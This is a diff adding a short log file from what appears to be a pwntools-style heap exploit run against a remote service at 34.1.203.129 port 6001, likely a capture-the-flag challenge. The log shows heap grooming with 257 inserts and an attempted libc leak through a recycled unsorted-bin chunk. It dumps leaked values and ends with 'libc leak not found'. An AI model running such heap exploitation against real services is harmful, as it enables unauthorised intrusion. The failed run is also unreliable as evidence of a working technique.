@@ -1,0 +1,13 @@
+[x] Opening connection to 34.1.203.129 on port 6001
+[x] Opening connection to 34.1.203.129 on port 6001: Trying 34.1.203.129
+[+] Opening connection to 34.1.203.129 on port 6001: Done
+[*] 1/4: grooming vector with 257 inserts
+[+] 257 inserts complete
+[*] 2/4: leaking libc through recycled unsorted-bin chunk
+[*] dump bytes=4,012, values=1,891
+[*] first nonzero: [(1103, '0x21'), (1104, '0x5fb8d73a2'), (1105, '0x71eda2ac718a591a'), (1107, '0x21'), (1108, '0x5fbd2cb75112'), (1109, '0x71eda2ac718a591a'), (1111, '0x31'), (1112, '0x5fb8d73a2'), (1113, '0x71eda2ac718a591a'), (1117, '0x51'), (1118, '0x5fb8d73a2'), (1119, '0x71eda2ac718a591a'), (1127, '0x91'), (1128, '0x5fb8d73a2'), (1129, '0x71eda2ac718a591a'), (1145, '0x111'), (1146, '0x5fb8d73a2'), (1147, '0x71eda2ac718a591a'), (1179, '0x211'), (1180, '0x5fb8d73a2')]
+[*] last values: ['0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0']
+[-] libc leak not found
+[*] first values: ['0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0']
+[*] raw prefix: b'0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n0\n'
+[*] Closed connection to 34.1.203.129 port 6001
